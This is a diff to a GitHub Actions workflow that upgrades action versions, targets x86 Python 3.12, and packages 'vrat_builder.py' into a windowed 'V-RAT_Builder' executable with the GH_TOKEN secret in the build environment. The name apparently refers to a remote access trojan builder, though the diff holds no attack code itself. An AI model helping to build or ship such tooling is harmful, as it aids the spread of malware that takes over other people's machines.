@@ -11,26 +11,29 @@ jobs:
     
     steps:
     - name: Checkout
-      uses: actions/checkout@v3
+      uses: actions/checkout@v4
     
     - name: Setup Python
-      uses: actions/setup-python@v4
+      uses: actions/setup-python@v5
       with:
-        python-version: '3.10'
+        python-version: '3.12'
+        architecture: 'x86'
     
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
         pip install pyinstaller requests
     
-    - name: Build EXE with GitHub Token
+    - name: Build EXE (x86)
       run: |
-        pyinstaller --onefile --windowed --name V-RAT_Builder vrat_builder.py
+        pyinstaller --onefile --windowed --name V-RAT_Builder --target-architecture x86 vrat_builder.py
       env:
         GITHUB_TOKEN: ${{ secrets.GH_TOKEN }}
     
     - name: Upload artifact
-      uses: actions/upload-artifact@v3
+      uses: actions/upload-artifact@v4
       with:
-        name: V-RAT_Builder
+        name: V-RAT_Builder_x86
         path: dist/V-RAT_Builder.exe
+        compression-level: 0
+        if-no-files-found: error
